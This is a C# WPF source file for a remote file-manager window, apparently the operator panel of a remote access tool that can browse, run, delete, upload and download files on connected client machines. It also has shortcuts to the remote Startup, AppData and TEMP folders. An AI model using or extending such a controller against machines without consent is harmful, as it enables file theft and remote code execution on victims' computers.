using CelestialDES.Helper;
using CelestialDES.Pages;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Forms;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using static CelestialDES.MainWindow;

namespace CelestialDES.wpfForms
{
    /// <summary>
    /// Логика взаимодействия для FileManager.xaml
    /// </summary>
    public partial class FileManager : Window
    {
        public int ConnectionID { get; set; }
        Clients ClientsObj;
        public FileManager(Clients clients)
        {
            ClientsObj = clients;
            InitializeComponent();
            if (ProgramSettings.WindowBlur) WindowBlur.SetIsEnabled(this, true);
        }

        private void btnClose_Click(object sender, RoutedEventArgs e)
        {
            DoubleAnimation tabanim = new DoubleAnimation();
            tabanim.EasingFunction = new PowerEase();
            tabanim.From = 1;
            tabanim.To = 0;
            tabanim.Duration = TimeSpan.FromMilliseconds(125);
            tabanim.Completed += anim_Completed;
            this.BeginAnimation(Window.OpacityProperty, tabanim);
        }

        void anim_Completed(object sender, EventArgs e)
        {
            this.Close();
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            PowerEase easeing = new PowerEase();
            easeing.EasingMode = EasingMode.EaseOut;
            DoubleAnimation tabanim = new DoubleAnimation();
            tabanim.EasingFunction = easeing;
            tabanim.From = 0;
            tabanim.To = 1;
            tabanim.Duration = TimeSpan.FromMilliseconds(70);
            this.BeginAnimation(Window.OpacityProperty, tabanim);
        }
        private bool animation_is_running = false;
        private void StackPanel_MouseMove(object sender, System.Windows.Input.MouseEventArgs e)
        {
            if (Mouse.LeftButton == MouseButtonState.Pressed)
            {
                if (!animation_is_running)
                {
                    var decreaseOpacityAnim = new DoubleAnimation(0.3, (Duration)TimeSpan.FromSeconds(0.15));
                    this.BeginAnimation(UIElement.OpacityProperty, decreaseOpacityAnim);
                    animation_is_running = true;
                }

                this.DragMove();
            }
            else
            {
                if (animation_is_running)
                {
                    var increaseOpacityAnim = new DoubleAnimation(1, (Duration)TimeSpan.FromSeconds(0.15));
                    this.BeginAnimation(UIElement.OpacityProperty, increaseOpacityAnim);
                    animation_is_running = false;
                }
            }
        }

        private void FM_Refresh(object sender, RoutedEventArgs e)
        {
            if (PathText.Text == string.Empty)
            {
                List<byte> ToSend = new List<byte>
                {
                    (int)41
                };
                PacketSender.Send(ConnectionID, ToSend.ToArray());
            }
            else
            {
                List<byte> ToSend = new List<byte>();
                ToSend.Add(42);
                ToSend.AddRange(Encoding.UTF8.GetBytes("" + PathText.Text));
                PacketSender.Send(ConnectionID, ToSend.ToArray());
            }
        }

        private void ListViewF_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            if (ListViewF.SelectedIndex == -1) return;
            try
            {
                if ((ClientsObj.fileslist[ListViewF.SelectedIndex].Type == "Drive") || (ClientsObj.fileslist[ListViewF.SelectedIndex].Type == "Removable") || (ClientsObj.fileslist[ListViewF.SelectedIndex].Type == "CD") || (ClientsObj.fileslist[ListViewF.SelectedIndex].Type == "Folder"))
                {
                    if (PathText.Text.Length == 0)
                        PathText.Text += ClientsObj.fileslist[ListViewF.SelectedIndex].Name;
                    else
                        PathText.Text += ClientsObj.fileslist[ListViewF.SelectedIndex].Name + "\\";
                }
                List<byte> ToSend = new List<byte>();
                ToSend.Add(42);
                ToSend.AddRange(Encoding.UTF8.GetBytes("" + PathText.Text));
                PacketSender.Send(ConnectionID, ToSend.ToArray());
            }
            catch { }
        }

        private void FM_back(object sender, RoutedEventArgs e)
        {
            if (PathText.Text.Length < 4)
            {
                PathText.Text = "";
                List<byte> ToSend1 = new List<byte>
                {
                    (int)41
                };
                PacketSender.Send(ConnectionID, ToSend1.ToArray());
            }
            else
            {
                PathText.Text = PathText.Text.Substring(0, PathText.Text.LastIndexOf("\\"));
                PathText.Text = PathText.Text.Substring(0, PathText.Text.LastIndexOf("\\") + 1);
                List<byte> ToSend = new List<byte>();
                ToSend.Add(42);
                ToSend.AddRange(Encoding.UTF8.GetBytes("" + PathText.Text));
                PacketSender.Send(ConnectionID, ToSend.ToArray());
            }
        }

        private void GoTo_Desktop(object sender, RoutedEventArgs e)
        {
            List<byte> ToSend = new List<byte>();
            ToSend.Add(42);
            ToSend.AddRange(Encoding.UTF8.GetBytes("%USERPROFILE%\\Desktop"));
            PacketSender.Send(ConnectionID, ToSend.ToArray());
        }

        private void GoTo_Appdata(object sender, RoutedEventArgs e)
        {
            List<byte> ToSend = new List<byte>();
            ToSend.Add(42);
            ToSend.AddRange(Encoding.UTF8.GetBytes("%AppData%"));
            PacketSender.Send(ConnectionID, ToSend.ToArray());
        }

        private void GoTo_Startup(object sender, RoutedEventArgs e)
        {
            List<byte> ToSend = new List<byte>();
            ToSend.Add(42);
            ToSend.AddRange(Encoding.UTF8.GetBytes("%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
            PacketSender.Send(ConnectionID, ToSend.ToArray());
        }

        private void GoTo_Userprofile(object sender, RoutedEventArgs e)
        {
            List<byte> ToSend = new List<byte>();
            ToSend.Add(42);
            ToSend.AddRange(Encoding.UTF8.GetBytes("%USERPROFILE%"));
            PacketSender.Send(ConnectionID, ToSend.ToArray());
        }

        private void GoTo_Temp(object sender, RoutedEventArgs e)
        {
            List<byte> ToSend = new List<byte>();
            ToSend.Add(42);
            ToSend.AddRange(Encoding.UTF8.GetBytes("%TEMP%"));
            PacketSender.Send(ConnectionID, ToSend.ToArray());
        }
        private void FM_Run(object sender, RoutedEventArgs e)
        {
            if (ListViewF.SelectedIndex == -1) return;
            List<byte> ToSend = new List<byte>();
            ToSend.Add(43);
            ToSend.AddRange(Encoding.UTF8.GetBytes(PathText.Text + ClientsObj.fileslist[ListViewF.SelectedIndex].Name));
            PacketSender.Send(ConnectionID, ToSend.ToArray());
        }

        private void FM_Delete(object sender, RoutedEventArgs e)
        {
            if (ListViewF.SelectedIndex == -1) return;
            List<byte> ToSend = new List<byte>();
            ToSend.Add(44);
            ToSend.AddRange(Encoding.UTF8.GetBytes(PathText.Text + ClientsObj.fileslist[ListViewF.SelectedIndex].Name));
            PacketSender.Send(ConnectionID, ToSend.ToArray());
        }

        private void FM_Upload(object sender, RoutedEventArgs e)
        {
            OpenFileDialog OFD = new OpenFileDialog();
            OFD.Multiselect = false;
            OFD.Filter = "Files (.*)|*.*";
            OFD.ShowDialog();
            if (OFD.FileName == null) return;
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)45);
            ToSend.AddRange(Encoding.UTF8.GetBytes(PathText.Text + OFD.SafeFileName));
            PacketSender.Send(ConnectionID, ToSend.ToArray());
            string FileString = OFD.FileName;
            byte[] FileBytes;
            using (FileStream FS = new FileStream(FileString, FileMode.Open))
            {
                FileBytes = new byte[FS.Length];
                FS.Read(FileBytes, 0, FileBytes.Length);

                ToSend.Clear();
                ToSend.Add((int)46);
                ToSend.AddRange(FileBytes);
                PacketSender.Send(ConnectionID, ToSend.ToArray());
            }
        }

        private void FM_Download(object sender, RoutedEventArgs e)
        {
            if(ListViewF.SelectedIndex == -1) return;
            ClientsObj.LastDLExt = System.IO.Path.GetExtension(PathText.Text + ClientsObj.fileslist[ListViewF.SelectedIndex].Name);
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)47);
            ToSend.AddRange(Encoding.UTF8.GetBytes(PathText.Text + ClientsObj.fileslist[ListViewF.SelectedIndex].Name));
            PacketSender.Send(ConnectionID, ToSend.ToArray());
        }
    }
}
